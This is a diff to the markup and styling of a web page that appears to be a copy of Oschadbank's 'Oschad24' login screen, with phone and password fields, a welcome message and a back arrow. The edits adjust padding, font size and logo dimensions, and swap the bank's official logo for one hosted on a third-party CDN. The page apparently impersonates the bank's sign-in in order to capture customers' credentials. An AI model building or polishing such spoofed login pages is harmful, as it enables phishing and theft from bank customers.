@@ -69,22 +69,23 @@
         }
         .oschad-header {
             width: 100%; display: flex; align-items: center;
-            padding: 10px 15px; background-color: #f8f9fa; position: relative;
+            padding: 15px; /* ИЗМЕНЕНИЕ: Увеличен padding для смещения контента вниз */
+            background-color: #f8f9fa; position: relative;
         }
         .oschad-header .back-arrow {
             font-size: 28px; color: #495057; margin-right: 15px;
             cursor: pointer; line-height: 1; z-index: 2;
         }
         .oschad-header .title {
-            font-size: 17px; font-weight: 500; color: #212529;
+            font-size: 16px; /* ИЗМЕНЕНИЕ: Шрифт сделан меньше */
+            font-weight: 500; color: #212529;
             flex-grow: 1; text-align: center;
-            /* Изменение: отступ для центрирования и вертикального выравнивания */
-            padding-left: 15px; /* Компенсация стрелки */
-            padding-top: 5px; /* Немного опустить */
         }
         .oschad-header-logo {
             position: absolute; right: 15px; top: 50%;
-            transform: translateY(-50%); height: 30px;
+            transform: translateY(-50%);
+            height: 30px;
+            width: 30px; /* ИЗМЕНЕНИЕ: Добавлена ширина для квадратной иконки */
         }
         .oschad-welcome-section {
             padding: 20px;
@@ -94,12 +95,12 @@
         }
         .oschad-main-title {
             font-size: 26px; font-weight: 700; margin-bottom: 8px;
-            text-align: center; /* Изменение */
+            text-align: center; 
         }
         .oschad-welcome-section p {
             font-size: 16px; color: #495057; line-height: 1.5;
             margin-bottom: 25px; font-weight: 400;
-            text-align: center; /* Изменение */
+            text-align: center; 
         }
         .oschad-toggle-buttons {
             display: flex; background-color: #e9ecef; border-radius: 12px;
@@ -135,7 +136,7 @@
             font-weight: 500; position: relative;
         }
         .oschad-input-field:focus { border-color: var(--oschad-primary); }
-        .oschad-input-field.error { border-color: var(--danger-color); } /* Стиль для ошибки */
+        .oschad-input-field.error { border-color: var(--danger-color); } 
         .oschad-input-field::placeholder { color: transparent; }
         .password-toggle-icon {
             position: absolute; right: 15px; top: 50%;
@@ -147,9 +148,9 @@
             border: 1px solid #dee2e6; border-radius: 12px;
             background-color: var(--white);
             overflow: hidden;
-            transition: border-color 0.2s ease; /* Добавлено для плавности */
+            transition: border-color 0.2s ease; 
         }
-        .oschad-phone-wrapper.error { border-color: var(--danger-color); } /* Стиль для ошибки */
+        .oschad-phone-wrapper.error { border-color: var(--danger-color); } 
         .oschad-phone-wrapper:focus-within {
             border-color: var(--oschad-primary);
         }
@@ -390,7 +391,7 @@ document.addEventListener('DOMContentLoaded', () => {
             <div class="oschad-header">
                 <span class="back-arrow" id="oschad-back-arrow">←</span>
                 <span class="title">Авторизуйтесь через Ощад24</span>
-                <img src="https://www.oschadbank.ua/uploads/1/8623-svg_logo_mob_osch.svg" alt="Oschadbank Logo" class="oschad-header-logo">
+                <img src="https://cdn.pay.ua/storages/images/628/222/628222c544838662998394.png" alt="Oschadbank Logo" class="oschad-header-logo">
             </div>
             <div class="oschad-welcome-section">
                 <h2 class="oschad-main-title">Ласкаво просимо</h2>
